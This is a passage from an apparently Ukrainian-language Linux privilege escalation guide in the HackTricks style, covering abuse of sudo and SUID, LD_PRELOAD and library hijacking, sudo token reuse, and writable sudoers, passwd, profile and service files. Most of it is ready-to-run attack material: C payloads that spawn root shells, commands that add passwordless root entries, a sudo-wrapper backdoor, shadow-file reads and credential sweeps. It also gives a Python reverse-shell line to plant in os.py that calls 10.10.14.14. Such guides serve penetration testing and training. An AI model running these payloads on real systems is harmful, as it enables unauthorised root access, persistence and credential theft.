Якщо вам не шкода створювати багато шуму і бінарні файли `su` та `timeout` присутні на комп'ютері, ви можете спробувати брутфорсити користувача, використовуючи [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається брутфорсити користувачів.

## Зловживання записуваними шляхами

### $PATH

Якщо ви виявите, що можете **записувати в деяку папку $PATH**, ви можете підвищити привілеї, **створивши бекдор у записуваній папці** з назвою якоїсь команди, яка буде виконуватися іншим користувачем (ідеально root) і яка **не завантажується з папки, що розташована перед** вашою записуваною папкою в $PATH.

### SUDO та SUID

Вам може бути дозволено виконувати деякі команди за допомогою sudo або вони можуть мати біт suid. Перевірте це, використовуючи:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють вам читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачу виконувати деякі команди з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тепер тривіально отримати оболонку, додавши ssh-ключ у директорію root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **оснований на машині HTB Admirer**, був **вразливим** до **PYTHONPATH hijacking** для завантаження довільної бібліотеки python під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Обхід шляхів виконання Sudo

**Перейдіть** для читання інших файлів або використовуйте **символьні посилання**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Команда Sudo/SUID бінарний файл без шляху до команди

Якщо **дозвіл sudo** надано для однієї команди **без вказівки шляху**: _hacker10 ALL= (root) less_, ви можете скористатися цим, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарний файл **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID бінарного файлу)**.

[Приклади корисного навантаження для виконання.](payloads-to-execute.md)

### SUID бінарний файл з шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **експортувати функцію**, названу так само, як команда, яку викликає файл suid.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте двійковий файл з suid, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї або кількох спільних бібліотек (.so файлів), які повинні бути завантажені завантажувачем перед усіма іншими, включаючи стандартну бібліотеку C (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти експлуатації цієї функції, особливо з **suid/sgid** виконуваними файлами, система накладає певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, де реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки в стандартних шляхах, які також є suid/sgid.

Ескалація привілеїв може статися, якщо у вас є можливість виконувати команди з `sudo`, і вихід `sudo -l` містить твердження **env_keep+=LD_PRELOAD**. Ця конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися та бути визнаною навіть коли команди виконуються з `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Тоді **скомпілюйте це** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **підвищте привілеї** запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Схожий privesc може бути зловжито, якщо зловмисник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, за яким будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви стикаєтеся з бінарним файлом з **SUID** правами, який здається незвичайним, доцільно перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, виникнення помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенціал для експлуатації.

Щоб експлуатувати це, потрібно створити C файл, скажімо _"/path/to/.config/libcalc.c"_, що міститиме наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпуляції з правами доступу до файлів та виконання оболонки з підвищеними привілеями.

Скомпілюйте вищезазначений C файл у спільний об'єкт (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, виконання ураженого SUID бінарного файлу має активувати експлойт, що дозволяє потенційне компрометування системи.

## Викрадення спільних об'єктів
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID бінарний файл, що завантажує бібліотеку з папки, куди ми можемо записувати, давайте створимо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що бібліотека, яку ви створили, повинна мати функцію під назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) - це кураторський список Unix-бінарників, які можуть бути використані зловмисником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) - це те ж саме, але для випадків, коли ви можете **тільки інжектувати аргументи** в команду.

Проект збирає легітимні функції Unix-бінарників, які можуть бути зловживані для виходу з обмежених оболонок, ескалації або підтримки підвищених привілеїв, передачі файлів, створення прив'язаних і реверсних оболонок, а також полегшення інших завдань після експлуатації.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете отримати доступ до `sudo -l`, ви можете використовувати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знайде він спосіб експлуатувати будь-яке правило sudo.

### Повторне використання токенів Sudo

У випадках, коли у вас є **доступ до sudo**, але немає пароля, ви можете ескалувати привілеї, **чекаючи виконання команди sudo, а потім перехоплюючи токен сесії**.

Вимоги для ескалації привілеїв:

- У вас вже є оболонка як користувач "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось за **останні 15 хвилин** (за замовчуванням це тривалість токена sudo, який дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` дорівнює 0
- `gdb` доступний (ви повинні мати можливість його завантажити)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або назавжди змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете ескалувати привілеї, використовуючи:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **перше експлуатаційне** (`exploit.sh`) створить бінарний файл `activate_sudo_token` в _/tmp_. Ви можете використовувати його для **активації токена sudo у вашій сесії** (ви не отримаєте автоматично root-оболонку, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Другий експлойт (`exploit_v2.sh`) створить sh shell в _/tmp_ **власником якого є root з setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Третій експлойт (`exploit_v3.sh`) створить файл sudoers, який робить токени sudo вічними і дозволяє всім користувачам використовувати sudo.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у папці або на будь-яких створених файлах всередині папки, ви можете використовувати бінарний [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) для **створення токена sudo для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є оболонка як цього користувача з PID 1234, ви можете **отримати привілеї sudo** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть бути прочитані лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви можете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете писати, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими правами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Є кілька альтернатив до бінарного файлу `sudo`, таких як `doas` для OpenBSD, не забудьте перевірити його конфігурацію за адресою `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв, і ви отримали оболонку в контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконуватиме ваш код як root, а потім команду користувача. Потім **змініть $PATH** контексту користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконує sudo, ваш виконуваний файл sudo виконується.

Зверніть увагу, що якщо користувач використовує іншу оболонку (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти інший приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на зразок:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки завантажуються конфігураційні файли**. Зазвичай, цей файл містить наступний шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що конфігураційні файли з `/etc/ld.so.conf.d/*.conf` будуть прочитані. Ці конфігураційні файли **вказують на інші папки**, де **бібліотеки** будуть **шукатися**. Наприклад, вміст файлу `/etc/ld.so.conf.d/libc.conf` є `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** на будь-який з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яка папка в конфігураційному файлі всередині `/etc/ld.so.conf.d/*.conf`, він може мати можливість підвищити привілеї.\
Ознайомтеся з **тим, як експлуатувати цю неправильну конфігурацію** на наступній сторінці:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши бібліотеку в `/var/tmp/flag15/`, вона буде використовуватися програмою в цьому місці, як зазначено в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають **підмножину доступних привілеїв root для процесу**. Це ефективно розбиває привілеї root **на менші та відмінні одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Таким чином, повний набір привілеїв зменшується, знижуючи ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про можливості та як їх зловживати**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Дозволи на директорії

У директорії **біт для "виконання"** означає, що користувач може "**cd**" у папку.\
**Біт "читання"** означає, що користувач може **переглядати** **файли**, а **біт "запису"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACL

Списки контролю доступу (ACL) представляють собою вторинний рівень дискреційних дозволів, здатний **перекривати традиційні дозволи ugo/rwx**. Ці дозволи покращують контроль над доступом до файлів або директорій, дозволяючи або заважаючи права конкретним користувачам, які не є власниками або частиною групи. Цей рівень **деталізації забезпечує більш точне управління доступом**. Додаткові деталі можна знайти [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надайте** користувачу "kali" дозволи на читання та запис для файлу:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з конкретними ACL з системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті сеанси оболонки

В **старих версіях** ви можете **викрасти** деякі **сеанси оболонки** іншого користувача (**root**).\
В **нових версіях** ви зможете **підключитися** лише до сеансів екрану **вашого власного користувача**. Однак ви можете знайти **цікаву інформацію всередині сеансу**.

### викрадення сеансів екрану

**Список сеансів екрану**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux сесії хакінгу

Це була проблема з **старими версіями tmux**. Я не зміг захопити сесію tmux (v2.1), створену root, будучи неправавленим користувачем.

**Список сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Всі SSL та SSH ключі, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 року та 13 травня 2008 року, можуть бути під впливом цього багу.\
Цей баг виникає під час створення нового ssh ключа в цих ОС, оскільки **було можливих лише 32,768 варіацій**. Це означає, що всі можливості можуть бути обчислені, і **маючи ssh публічний ключ, ви можете шукати відповідний приватний ключ**. Ви можете знайти обчислені можливості тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Цікаві конфігураційні значення

- **PasswordAuthentication:** Вказує, чи дозволена аутентифікація за паролем. За замовчуванням `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена аутентифікація за публічним ключем. За замовчуванням `yes`.
- **PermitEmptyPasswords**: Коли аутентифікація за паролем дозволена, вказує, чи дозволяє сервер вхід до облікових записів з порожніми рядками паролів. За замовчуванням `no`.

### PermitRootLogin

Вказує, чи може root увійти за допомогою ssh, за замовчуванням `no`. Можливі значення:

- `yes`: root може увійти за допомогою пароля та приватного ключа
- `without-password` або `prohibit-password`: root може увійти лише з приватним ключем
- `forced-commands-only`: Root може увійти лише за допомогою приватного ключа, якщо вказані параметри команд
- `no` : ні

### AuthorizedKeysFile

Вказує файли, які містять публічні ключі, що можуть бути використані для аутентифікації користувачів. Він може містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказати абсолютні шляхи** (починаючи з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вказує, що якщо ви спробуєте увійти з **приватним** ключем користувача "**testusername**", ssh буде порівнювати публічний ключ вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH агентне пересилання дозволяє вам **використовувати ваші локальні SSH ключі замість того, щоб залишати ключі** (без паролів!) на вашому сервері. Таким чином, ви зможете **перескочити** через ssh **на хост** і звідти **перескочити на інший** хост **використовуючи** **ключ**, розташований на вашому **початковому хості**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` дорівнює `*`, щоразу, коли користувач переходить на іншу машину, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписати** ці **опції** та дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволити** або **заборонити** пересилання ssh-agent за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для ескалації привілеїв**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли під `/etc/profile.d/` є **скриптами, які виконуються, коли користувач запускає нову оболонку**. Тому, якщо ви можете **записувати або змінювати будь-який з них, ви можете ескалувати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено будь-який дивний профільний скрипт, ви повинні перевірити його на **чутливі дані**.

### Файли Passwd/Shadow

В залежності від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або може бути резервна копія. Тому рекомендується **знайти всі з них** і **перевірити, чи можете ви їх прочитати**, щоб побачити **чи є там хеші**.
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
В деяких випадках ви можете знайти **password hashes** всередині файлу `/etc/passwd` (або еквівалентного).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і додайте згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використовувати наступні рядки, щоб додати фіктивного користувача без пароля.\
ПОПЕРЕДЖЕННЯ: ви можете знизити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: На платформах BSD `/etc/passwd` знаходиться за адресою `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації служби**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо машина працює на сервері **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш бекдор буде виконано наступного разу, коли буде запущено tomcat.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивні місця/Власні файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли бази даних Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_історія, .sudo_as_admin_successful, профіль, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Сховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/Бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **декілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використовувати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), який є відкритим програмним забезпеченням, що використовується для отримання багатьох паролів, збережених на локальному комп'ютері для Windows, Linux та Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивніший лог, тим цікавішим він буде (ймовірно).\
Також деякі "**погано**" налаштовані (задніми дверима?) **аудиторські логи** можуть дозволити вам **записувати паролі** всередині аудиторських логів, як пояснено в цьому пості: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати журнали, група** [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дійсно корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевірити файли, що містять слово "**password**" у **назві** або всередині **вмісту**, а також перевірити IP-адреси та електронні адреси в логах або регулярні вирази для хешів.\
Я не буду перераховувати тут, як це все зробити, але якщо вас це цікавить, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватись python-скрипт і ви **можете записувати в** цю папку або ви **можете модифікувати python-бібліотеки**, ви можете змінити бібліотеку OS і створити бекдор (якщо ви можете записувати, де буде виконуватись python-скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **створити бекдор у бібліотеці**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість у `logrotate` дозволяє користувачам з **права на запис** у файл журналу або його батьківські директорії потенційно отримати підвищені привілеї. Це пов'язано з тим, що `logrotate`, який часто працює як **root**, може бути маніпульований для виконання довільних файлів, особливо в таких директоріях, як _**/etc/bash_completion.d/**_. Важливо перевіряти права доступу не лише в _/var/log_, але й у будь-якій директорії, де застосовується ротація журналів.

> [!NOTE]
> Ця уразливість впливає на версію `logrotate` `3.18.0` та старіші

Більш детальну інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

